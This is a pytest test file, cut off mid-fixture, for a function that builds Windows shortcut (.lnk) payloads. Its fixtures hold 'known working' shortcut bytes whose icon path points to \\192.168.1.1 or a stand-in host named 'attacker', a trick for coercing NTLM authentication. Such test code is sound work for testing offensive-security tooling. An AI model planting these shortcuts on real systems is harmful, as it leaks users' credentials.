"""
This module contains unit tests for the `create_lnk_payload` function from the
`linksiren.pure_functions` module.

The tests use pytest fixtures to provide sample payloads and template bytes for testing purposes.
The tests verify that the `create_lnk_payload` function correctly generates payloads based on
different inputs, such as IP addresses and hostnames, and handles edge cases like excessively
long paths.

Fixtures:
    template_bytes: Provides a list of bytes representing a template payload.
    payload_ip_bytes: Provides a known working payload with the target IP set to 192.168.1.1.
    payload_hostname_bytes: Provides a known working payload with the target hostname set to
                            'attacker'.

Tests:
    test_payload_valid_ip: Verifies that the payload generated for a valid IP address matches the
                           expected result.
    test_payload_valid_hostname: Verifies that the payload generated for a valid hostname matches
                                 the expected result.
    test_payload_path_too_long: Verifies that the function returns False when the attacker IP
                                exceeds the maximum path length.
"""
import pytest
from linksiren.pure_functions import create_lnk_payload

@pytest.fixture
def template_bytes():
    """
    Returns a list of bytes representing a template payload.

    This function returns a hardcoded list of bytes that can be used as a template
    payload for testing purposes. The byte sequence includes various sections and
    metadata, such as file paths, identifiers, and other binary data.

    Returns:
        list: A list of bytes representing the template payload.
    """
    return list(b'L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F\xc2\x02\x08\x00\xa0\x00\x00\x00\x80.\x88\x0f\x08I\xda\x01\x00\x1e\xfe~\x08I\xda\x01\x00\xe2\xf3\xb1\x07I\xda\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00<\x00\x00\x00 \x00\x00\x00\x02\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xee\x00\\\x00\\\x00t\x00e\x00s\x00t\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00.\x00i\x00c\x00o\x00\xc7\x00\x00\x00\t\x00\x00\xa0=\x00\x00\x001SPS\xed0\xbd\xdaC\x00\x89G\xa7\xf8\xd0\x13\xa4sf"!\x00\x00\x00d\x00\x00\x00\x00\x1f\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac\x1d\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00E\x00\x00\x001SPS\xa6jc(=\x95\xd2\x11\xb5\xd6\x00\xc0O\xd9\x18\xd0)\x00\x00\x00\x1e\x00\x00\x00\x00\x1f\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15\x04\x00\x00\x0c\x00\x00\xa0\x14\x00\x1fX\r\x1a,\xf0!\xbePC\x88\xb0sg\xfc\x96\xef<\xab\x00\x00\x00\xa5\x00\xbb\xaf\x93;\x97\x00\x04\x00\x00\x00\x00\x00-\x00\x00\x001SPSsC\xe5\n\xbeC\xadO\x85\xe4i\xdc\x863\x98n\x11\x00\x00\x00\x0b\x00\x00\x00\x00\x0b\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac\x1d\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00t\x00e\x00s\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00-\x00\x00\x001SPS:\xa4\xbd\xde\xb37\x83C\x91\xe7D\x98\xda)\x95\xab\x11\x00\x00\x00\x03\x00\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&\x00\xc3\x01\xc5C:\\Users\x00\x00\x03\x00Microsoft Network\x00\x00\x02\x00\x04\x021\x00\x00\x10\x00\x001X\xbd-\x10\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00^\x01\t\x00\x04\x00\xef\xbe1X\xbd-1X\xd4-.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00%\x00U\x00S\x00E\x00R\x00N\x00A\x00M\x00E\x00%\x00/\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00"\x012\x00\x00\x00\x00\x001X\x12-\xa0\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt\x00\xc8\x00\t\x00\x04\x00\xef\xbe1Xg-1X\xca-.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\x00\x00\x00\x14\x03\x00\x00\x01\x00\x00\xa0\\\\test\\TEST\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x00\\\x00t\x00e\x00s\x00t\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00.\x00t\x00x\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')


@pytest.fixture
def payload_ip_bytes():
    """
    Generates a known working payload with the target IP set to 192.168.1.1.

    Returns:
        bytes: A byte string representing the payload.
    """
    # Known working payload with target IP set to 192.168.1.1
    return b'L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F\xc2\x02\x08\x00\xa0\x00\x00\x00\x80.\x88\x0f\x08I\xda\x01\x00\x1e\xfe~\x08I\xda\x01\x00\xe2\xf3\xb1\x07I\xda\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00<\x00\x00\x00 \x00\x00\x00\x02\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xee\x00\\\x00\\\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x00.\x001\x00\\\x00t\x00e\x00s\x00t\x00.\x00i\x00c\x00o\x00\x00\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00.\x00i\x00c\x00o\x00\xc7\x00\x00\x00\t\x00\x00\xa0=\x00\x00\x001SPS\xed0\xbd\xdaC\x00\x89G\xa7\xf8\xd0\x13\xa4sf"!\x00\x00\x00d\x00\x00\x00\x00\x1f\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac\x1d\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00E\x00\x00\x001SPS\xa6jc(=\x95\xd2\x11\xb5\xd6\x00\xc0O\xd9\x18\xd0)\x00\x00\x00\x1e\x00\x00\x00\x00\x1f\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15\x04\x00\x00\x0c\x00\x00\xa0\x14\x00\x1fX\r\x1a,\xf0!\xbePC\x88\xb0sg\xfc\x96\xef<\xab\x00\x00\x00\xa5\x00\xbb\xaf\x93;\x97\x00\x04\x00\x00\x00\x00\x00-\x00\x00\x001SPSsC\xe5\n\xbeC\xadO\x85\xe4i\xdc\x863\x98n\x11\x00\x00\x00\x0b\x00\x00\x00\x00\x0b\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac\x1d\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00t\x00e\x00s\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00-\x00\x00\x001SPS:\xa4\xbd\xde\xb37\x83C\x91\xe7D\x98\xda)\x95\xab\x11\x00\x00\x00\x03\x00\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&\x00\xc3\x01\xc5C:\\Users\x00\x00\x03\x00Microsoft Network\x00\x00\x02\x00\x04\x021\x00\x00\x10\x00\x001X\xbd-\x10\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00^\x01\t\x00\x04\x00\xef\xbe1X\xbd-1X\xd4-.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00%\x00U\x00S\x00E\x00R\x00N\x00A\x00M\x00E\x00%\x00/\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00"\x012\x00\x00\x00\x00\x001X\x12-\xa0\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt\x00\xc8\x00\t\x00\x04\x00\xef\xbe1Xg-1X\xca-.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\x00\x00\x00\x14\x03\x00\x00\x01\x00\x00\xa0\\\\test\\TEST\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x00\\\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x00.\x001\x00\\\x00t\x00e\x00s\x00t\x00\x00\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00.\x00t\x00x\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'


@pytest.fixture
def payload_hostname_bytes():
    """
    Returns a known working payload with the target hostname set to 'attacker'.

    The payload is a byte string that represents a specific configuration or
    data structure used in the context of the application.

    Returns:
        bytes: A byte string representing the payload with the target hostname.
    """
    # Known working payload with target hostname set to attacker
    return b'L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F\xc2\x02\x08\x00\xa0\x00\x00\x00\x80.\x88\x0f\x08I\xda\x01\x00\x1e\xfe~\x08I\xda\x01\x00\xe2\xf3\xb1\x07I\xda\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00<\x00\x00\x00 \x00\x00\x00\x02\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xee\x00\\\x00\\\x00a\x00t\x00t\x00a\x00c\x00k\x00e\x00r\x00\\\x00t\x00e\x00s\x00t\x00.\x00i\x00c\x00o\x00\x00\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00